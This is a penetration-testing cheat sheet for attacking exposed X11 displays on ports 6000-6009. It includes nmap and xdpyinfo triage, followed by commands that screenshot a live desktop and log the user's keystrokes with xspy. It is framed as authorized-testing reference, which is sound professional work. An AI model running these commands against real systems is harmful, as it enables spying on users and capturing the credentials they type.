# X11 — quick wins

**When you see it:** 6000-6009/tcp open and nmap `x11-access` reports *"X server access is granted"* →
an **open display**. Any client can attach: screenshot the desktop and log keystrokes.

> Authorized testing only. Commands assume you have written authorization for the
> target. Read-only triage first; anything that writes/changes state is marked ✏️.

## Triage (read-only)
```sh
nmap -Pn -p6000-6009 --script x11-access H     # "access is granted" = open display
xdpyinfo -display H:0                           # confirm + enumerate screens/extensions
```
Port → display: `6000`→`:0`, `6001`→`:1`, … (`disp = port - 6000`).

## Quick wins

### Confirm the open display
```sh
xdpyinfo -display H:0
xwininfo -root -tree -display H:0               # window tree = what's on screen
```
*Why:* a successful `xdpyinfo` proves unauth attach and dumps screen geometry, extensions, and the
window list — you now see what the user is running.

### Screenshot the desktop ✏️ — sensitive
```sh
import -display H:0 -window root shot.png        # ImageMagick
xwd -root -display H:0 | xwud                     # or capture to an .xwd
```
*Why:* pulls the live framebuffer — passwords on screen, open documents, session state. Marked ✏️ as it
actively attaches to and reads a live user session; capture only what scope allows.

### Keylog the session ✏️ — sensitive
```sh
xspy H:0                                          # or xwatchwin for live view
```
*Why:* an open display lets you snoop keystrokes (`xspy`) — credentials typed after you attach. Highly
intrusive; explicit sign-off required.

## Gotchas
- Modern desktops bind X to loopback / use `xauth` MIT cookies — "access denied" means cookie auth is on, not that the port is closed.
- Wayland sessions don't expose a network X socket at all (unless XWayland is TCP-listening, which is off by default).
- SSH X11-forwarding (`localhost:10.0`, port 6010+) is *not* the same as a genuinely open remote display.
